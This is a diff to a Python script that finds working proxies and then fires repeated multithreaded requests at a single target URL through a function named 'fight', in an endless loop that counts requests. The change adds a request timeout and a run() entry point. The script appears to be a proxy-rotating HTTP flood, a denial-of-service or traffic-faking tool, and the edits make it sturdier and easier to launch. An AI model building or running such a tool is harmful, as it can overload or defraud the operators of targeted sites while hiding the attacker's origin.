@@ -41,7 +41,7 @@ def get_random_working_proxy():
             }
         
         try:
-            resp_code = scraper.get(url, cookies=cookies, proxies=proxies).status_code
+            resp_code = scraper.get(url, timeout=1, cookies=cookies, proxies=proxies).status_code
             if resp_code == 200:
                 return proxies
         except Exception as ct:
@@ -59,18 +59,23 @@ def fight(url, proxy):
     return "Success"
 
 
-while True:
-    proxy = get_random_working_proxy()
-    print(f"Proxy found: {proxy}")
-    if proxy:
-        threads = []
-        with ThreadPoolExecutor(max_workers=THREADS) as executor:
-            for link in [url] * THREADS:
-                threads.append(executor.submit(fight, link, proxy))
-                
-            for task in as_completed(threads):
-                print(task.result())
+def run():
+    while True:
+        proxy = get_random_working_proxy()
+        print(f"Proxy found: {proxy}")
+        if proxy:
+            threads = []
+            with ThreadPoolExecutor(max_workers=THREADS) as executor:
+                for link in [url] * THREADS:
+                    threads.append(executor.submit(fight, link, proxy))
+                    
+                for task in as_completed(threads):
+                    print(task.result())
 
-    count += 20
-    if count == 1000:
-        print(f"Performed {count} requests!")
+        count += 20
+        if count == 1000:
+            print(f"Performed {count} requests!")
+
+
+if __name__ == "__main__":
+    run()
